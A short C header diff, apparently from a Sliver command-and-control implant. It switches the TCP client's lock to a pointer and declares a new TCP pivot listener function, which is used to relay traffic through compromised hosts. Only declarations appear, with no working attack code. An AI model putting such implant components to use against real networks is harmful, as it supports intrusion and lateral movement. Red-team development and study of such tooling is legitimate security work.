@@ -6,7 +6,7 @@ typedef struct _SLIVER_TCP_CLIENT {
 	DWORD dwWriteDeadline;
 	DWORD dwReadDeadline;
 	SOCKET Sock;
-	CRITICAL_SECTION Lock;
+	PCRITICAL_SECTION pLock;
 } SLIVER_TCP_CLIENT, *PSLIVER_TCP_CLIENT;
 
 PSLIVER_TCP_CLIENT TcpInit();
@@ -38,4 +38,11 @@ BOOL TcpSend
 	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_TCP_CLIENT pTcpClient,
 	_In_ PENVELOPE pEnvelope
+);
+
+PPIVOT_LISTENER CreateTCPPivotListener
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ LPVOID lpClient,
+	_In_ LPSTR lpBindAddress
 );
